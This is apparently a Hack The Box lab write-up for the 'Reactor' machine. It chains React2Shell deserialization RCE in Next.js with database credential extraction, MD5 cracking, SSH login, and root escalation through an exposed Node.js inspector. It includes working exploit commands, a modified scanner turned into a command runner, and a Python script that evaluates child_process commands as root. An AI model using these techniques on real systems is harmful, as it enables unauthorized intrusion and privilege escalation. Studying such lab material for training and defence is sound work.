# HTB Reactor

## Overview

- Season: 11
- Difficulty: TBD
- OS: Linux
- Initial Access: React2Shell RCE in a Next.js App Router application
- Privilege Escalation: Root-owned Node.js inspector exposed on loopback

> Flags, credentials, private keys, target IPs, and sensitive values are redacted.

## Executive Summary

Reactor exposed a Next.js App Router application on port `3000`. Normal route and static asset enumeration showed a mostly static dashboard, but the stack was vulnerable to a React Server Components deserialization issue associated with React2Shell-style exploitation.

After confirming the issue with the Assetnote React2Shell scanner, the scanner payload was modified into a command runner. Command output was base64-encoded and returned through the `X-Action-Redirect` header.

The RCE was used to enumerate the application directory, extract a SQLite database, recover password hashes, crack an MD5 hash, and SSH as the `engineer` user.

Privilege escalation came from a root-owned Node.js process running with the V8 inspector bound to `127.0.0.1:9229`. SSH access allowed the local inspector port to be tunneled, and JavaScript was evaluated inside the root process to execute commands as root.

## Attack Path

1. Enumerated exposed services and found SSH plus a Next.js web application.
2. Inspected the web page, static assets, and React Server Components behavior.
3. Confirmed React2Shell-style RCE with the Assetnote scanner.
4. Modified the scanner into a command runner.
5. Used command execution to enumerate `/opt/reactor-app`.
6. Found and extracted `reactor.db`.
7. Recovered MD5 password hashes from the database.
8. Cracked the `engineer` password hash.
9. Logged in over SSH as `engineer`.
10. Found a root-owned Node.js process with inspector enabled on `127.0.0.1:9229`.
11. Used SSH local port forwarding to reach the inspector.
12. Used the V8 inspector WebSocket API to evaluate JavaScript in the root process.
13. Executed OS commands as root.

## Reconnaissance

Initial Nmap scan:

```bash
sudo nmap -sCV -p22,3000 TARGET_IP
```

Findings:

```text
22/tcp    SSH
3000/tcp  Next.js web application
```

The web app required the hostname:

```text
reactor.htb
```

A one-off hostname resolution with `curl`:

```bash
curl --resolve reactor.htb:3000:TARGET_IP -s http://reactor.htb:3000/ -o index.html
```

Why this mattered:

- `22/tcp` gave a possible path after credentials were found.
- `3000/tcp` exposed the web application and initial attack surface.
- The app used Next.js/React Server Components behavior, which was important for the vulnerability check.

## Web Enumeration

Static Next.js assets were extracted from the downloaded HTML:

```bash
grep -Eoi '/_next/static/[^"]+\.(js|css)' index.html | sort -u
```

The React Server Components response was requested:

```bash
curl -s -H 'RSC: 1' http://reactor.htb:3000/ -o home.rsc
```

Normal content discovery did not reveal useful routes:

```bash
ffuf -u http://reactor.htb:3000/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
  -fc 404
```

Virtual host fuzzing also did not produce a useful result:

```bash
ffuf -u http://TARGET_IP:3000/ \
  -H 'Host: FUZZ.htb:3000' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs NORMAL_RESPONSE_SIZE
```

Why this mattered:

The web app looked static from normal browsing and route fuzzing. The important lead came from the framework behavior, not from hidden routes.

## React2Shell Confirmation

The Assetnote scanner was used in an isolated Python environment:

```bash
git clone https://github.com/assetnote/react2shell-scanner
cd react2shell-scanner
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

Target list:

```bash
printf 'http://reactor.htb:3000\n' > targets.txt
```

Safe check:

```bash
python3 scanner.py -l targets.txt \
  -H 'Host: reactor.htb:3000' \
  --safe-check \
  -v \
  -o reactor-safe.json
```

Active proof:

```bash
python3 scanner.py -l targets.txt \
  -H 'Host: reactor.htb:3000' \
  -v \
  -o reactor-rce.json
```

Result:

```text
The response included an X-Action-Redirect header containing scanner-controlled output.
```

Why this mattered:

The scanner confirmed unauthenticated RCE through React Server Components deserialization behavior.

## Turning The Scanner Into A Command Runner

The scanner already contained a working serialized payload. A copy was made so the original stayed intact:

```bash
cp scanner.py rce.py
```

The command was changed from the deterministic math proof to a base64-wrapped OS command:

```python
cmd = 'id | base64 -w0'
```

The redirect matcher was relaxed:

```python
return "/login?a=" in redirect_header
```

Run the modified scanner:

```bash
python3 rce.py -l targets.txt \
  -H 'Host: reactor.htb:3000' \
  -v \
  -o reactor-id.json
```

Extract and decode command output:

```bash
grep -i 'x-action-redirect' reactor-id.json \
  | sed -E 's/.*\/login\?a=([^;]+);push.*/\1/' \
  | base64 -d
```

Result:

```text
Command execution as the Node.js application user.
```

Why base64 was used:

The command output traveled through an HTTP redirect header. Base64 made the output safer to transport and easier to decode reliably.

## Application Enumeration

Useful command runner payloads:

```python
cmd = 'pwd | base64 -w0'
cmd = 'ls -la /opt/reactor-app | base64 -w0'
cmd = 'cat /opt/reactor-app/package.json 2>&1 | base64 -w0'
cmd = 'strings /opt/reactor-app/reactor.db | head -80 | base64 -w0'
```

Findings:

```text
/opt/reactor-app
package.json
reactor.db
Next.js 15.0.3
React 19.0.0
```

The SQLite database contained user rows and MD5 password hashes.

Why this mattered:

The RCE did not immediately provide an interactive shell, but it was enough to read application files and extract credentials.

## Hash Cracking And SSH

Hashes were saved in John-compatible format:

```bash
cat > hashes.txt <<'EOF'
engineer:REDACTED_MD5_HASH
admin:REDACTED_MD5_HASH
EOF
```

Crack with John:

```bash
john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show --format=raw-md5 hashes.txt
```

Recovered credential:

```text
engineer:[REDACTED]
```

SSH login:

```bash
ssh engineer@reactor.htb
```

Sudo check:

```bash
sudo -l
```

Result:

```text
SSH as engineer succeeded.
sudo was denied for engineer.
```

## Privilege Escalation Via Node Inspector

This was not a classic sudo or SUID privilege escalation. Local enumeration showed a root-owned Node.js process with the inspector bound to loopback.

```bash
ss -lntp
ps auxww | grep -iE 'node|inspect|9229' | grep -v grep
```

Finding:

```text
127.0.0.1:9229
/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
Process owner: root
```

Why this mattered:

The Node inspector allows JavaScript evaluation inside the running process. Since the process was owned by root, JavaScript executed through the inspector could run OS commands as root.

## Tunneling The Inspector

Because the inspector was bound to target loopback, it was not directly reachable from the attacker machine. SSH access as `engineer` made it reachable through local port forwarding:

```bash
ssh -L 9229:127.0.0.1:9229 engineer@reactor.htb
```

Query the inspector:

```bash
curl -s http://127.0.0.1:9229/json/list | jq .
```

The response contained a WebSocket debugger URL for the root-owned Node process.

## Root Command Execution

A local Python virtual environment was used for WebSocket tooling:

```bash
python3 -m venv wsvenv
source wsvenv/bin/activate
pip install websocket-client requests
```

The exploit script connected to the V8 inspector and evaluated JavaScript:

```python
#!/usr/bin/env python3
import json
import requests
import websocket

target = requests.get("http://127.0.0.1:9229/json/list").json()[0]
wsurl = target["webSocketDebuggerUrl"]
ws = websocket.create_connection(wsurl)

next_id = 1

def send(method, params=None):
    global next_id
    request_id = next_id
    next_id += 1
    ws.send(json.dumps({
        "id": request_id,
        "method": method,
        "params": params or {}
    }))
    while True:
        msg = json.loads(ws.recv())
        if msg.get("id") == request_id:
            return msg

print(send("Runtime.enable"))

expr = """
global.process.mainModule.require('child_process')
  .execSync('id; cat /root/root.txt')
  .toString()
"""

resp = send("Runtime.evaluate", {
    "expression": expr,
    "returnByValue": True,
    "awaitPromise": True
})

print(json.dumps(resp, indent=2))
ws.close()
```

Run it:

```bash
python3 root-inspect.py
```

Result:

```text
uid=0(root)
root flag: [REDACTED]
```

## Why The Privilege Escalation Worked

- The inspector was bound to loopback, so it was not externally reachable.
- SSH access as `engineer` allowed tunneling to the target loopback port.
- The inspector controlled a root-owned Node.js process.
- `Runtime.evaluate` allowed arbitrary JavaScript execution in that process.
- JavaScript could import `child_process` and execute OS commands as root.

## Attack Chain

```text
Next.js app on port 3000
-> React2Shell-style RSC deserialization RCE
-> modified scanner into command runner
-> enumerate /opt/reactor-app
-> extract reactor.db
-> crack engineer MD5 hash
-> SSH as engineer
-> find root Node inspector on 127.0.0.1:9229
-> tunnel inspector through SSH
-> Runtime.evaluate JavaScript in root Node process
-> command execution as root
```

## Key Lessons

- Static-looking web apps can still expose dangerous framework-level attack surfaces.
- React Server Components behavior is worth testing when Next.js/React versions are suspicious.
- Scanner payloads can sometimes be adapted into controlled command runners.
- Base64 is useful when command output must travel through fragile channels like headers.
- Unsalted MD5 password hashes are weak and should not be used.
- Node.js inspector must not be exposed in production, even on loopback, unless access is tightly controlled.
- Local-only debug services become reachable after SSH access through port forwarding.

## Defensive Recommendations

- Patch affected React, React DOM, and Next.js versions.
- Disable Node.js inspector in production.
- Treat local debug sockets as privileged interfaces.
- Avoid storing password hashes with raw MD5.
- Restrict application databases and environment files to only the service account that needs them.
- Monitor for unexpected inspector ports and debug flags in production processes.
